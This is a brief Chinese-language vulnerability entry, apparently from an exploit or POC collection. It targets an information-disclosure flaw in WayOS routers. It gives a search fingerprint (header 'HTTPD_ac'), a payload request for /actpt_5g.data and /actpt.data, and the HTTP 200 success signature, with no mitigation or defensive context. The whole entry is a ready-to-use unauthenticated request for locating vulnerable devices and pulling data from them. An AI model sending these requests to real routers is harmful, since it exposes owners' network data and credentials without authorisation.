# WayOS路由系统actptactpt_5g存在信息泄露漏洞

WayOS ｜ 信息泄露 ｜ —
- **指纹**：`header="HTTPD_ac"`
- **请求**：`GET /actpt.data HTTP/1.1`

**Payload**
```
GET /actpt_5g.data HTTP/1.1
Host:
```
- **响应特征**：200